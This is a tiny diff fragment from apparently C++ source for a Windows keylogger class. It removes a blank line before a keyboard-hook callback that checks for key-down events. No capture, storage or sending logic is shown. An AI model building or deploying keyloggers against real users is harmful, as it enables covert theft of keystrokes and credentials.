@@ -39,7 +39,6 @@ KeyLogger::~KeyLogger()
 	}
 }
 
-
 LRESULT KeyLogger::HookCallback(const int nCode, const WPARAM wParam, LPARAM lParam)
 {
 	if (nCode >= 0 && wParam == WM_KEYDOWN)
